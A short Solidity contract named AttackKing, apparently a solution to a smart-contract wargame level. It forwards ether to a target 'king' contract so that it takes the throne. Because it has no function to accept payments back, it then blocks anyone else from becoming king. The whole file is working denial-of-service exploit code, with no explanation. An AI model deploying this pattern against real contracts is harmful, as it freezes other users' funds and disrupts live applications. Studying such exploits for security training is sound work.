// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackKing {
    function attack(address payable _king) external payable  {
        (bool sent,) = _king.call{value:msg.value}("");
        require(sent,"fail sent!");
    }
}
